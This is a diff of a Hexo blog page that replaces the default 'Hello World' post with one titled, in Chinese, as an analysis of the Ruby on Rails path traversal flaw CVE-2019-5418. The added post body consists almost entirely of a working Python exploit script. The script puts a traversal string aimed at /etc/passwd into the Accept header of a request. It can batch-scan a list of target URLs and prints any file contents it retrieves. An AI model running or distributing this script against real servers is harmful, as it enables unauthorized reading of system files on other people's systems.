@@ -12,7 +12,7 @@
 
 
 
-<title>Hello World! | Dokyyy</title>
+<title>CVE-2019-5418-Ruby on Rails路径穿越与任意文件读取分析文档 | Dokyyy</title>
 
 
 
@@ -173,7 +173,7 @@
     
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">Hello World!</h1>
+            <h1 class="post-title">CVE-2019-5418-Ruby on Rails路径穿越与任意文件读取分析文档</h1>
             
                 <div class="post-meta">
                     
@@ -182,7 +182,7 @@
 
                     
                         <span class="post-time">
-                        Date: <a href="#">May 29, 2020&nbsp;&nbsp;18:19:08</a>
+                        Date: <a href="#">May 30, 2020&nbsp;&nbsp;8:56:36</a>
                         </span>
                     
                     
@@ -191,20 +191,51 @@
         </header>
 
         <div class="post-content">
-            <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
+            <h1 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h1><pre><code>#CVE-2019-5418Ruby on Rails路径穿越与任意文件
 
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+# Usage：python3 CVE-2019-5418.py -u url
 
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+# python3 CVE-2019-5418.py -f url.txt
 
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+import requests
+import argparse
+import sys
+def rail_poc(url):
+    url = url+&apos;/robots&apos;
+    headers = {
+        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0&quot;,
+        &quot;Accept&quot;: &quot;../../../../../../etc/passwd{{&quot;,
+        &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;,
+        &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,
+        &quot;DNT&quot;: &quot;1&quot;,
+        &quot;Connection&quot;: &quot;close&quot;,
+        &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,
+    }
+    resp = requests.get(url,headers=headers).text
+    if &quot;nologin&quot; in resp:
+        print(url+&quot;存在任意文件读取漏洞&quot;)
+        print(resp)
+    else:
+        print(&quot;不存在漏洞&quot;)
 
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+if __name__ == &apos;__main__&apos;:
+    if len(sys.argv) == 1:
+        print(&apos;python3 CVE-2019-5418.py -u url&apos;)
+        print(&apos;python3 CVE-2019-5418.py -f url.txt&apos;)
 
+    parser = argparse.ArgumentParser(description=&quot;CVE-2019-5418.py -u 指定url -f 指定文本&quot;)
+    parser.add_argument(&apos;-u&apos;, &apos;--url&apos;, default=&apos;&apos;, help=&quot;-u http://xx.xx.xx.xx&quot;)
+    parser.add_argument(&apos;-f&apos;, &apos;--file&apos;, default=&apos;&apos;, help=&quot;-f xxx.txt&quot;)
+    args = parser.parse_args()
+
+    if args.url:
+        rail_poc(args.url)
+    if args.file:
+        with open(args.file,&apos;r&apos;) as f:
+            urls = f.readlines()
+        for url in urls:
+            url = url.strip(&apos;\n&apos;).strip(&apos;\r&apos;)
+            rail_poc(url)</code></pre>
         </div>
 
         
@@ -218,7 +249,7 @@
                 
                     <p class="copyright-item">
                         <span>Permalink:</span>
-                        <span><a href="https://dokyyy.github.io/2020/05/29/hello-world/">https://dokyyy.github.io/2020/05/29/hello-world/</a></span>
+                        <span><a href="https://dokyyy.github.io/2020/05/30/Ruby-on-Rails/">https://dokyyy.github.io/2020/05/30/Ruby-on-Rails/</a></span>
                     </p>
                 
                 
@@ -251,8 +282,8 @@
         </section>
         <section class="post-nav">
             
-                <a class="prev" rel="prev" href="/2020/05/30/Ruby-on-Rails/">CVE-2019-5418-Ruby on Rails路径穿越与任意文件读取分析文档</a>
             
+            <a class="next" rel="next" href="/2020/05/29/hello-world/">Hello World!</a>
             
         </section>
 
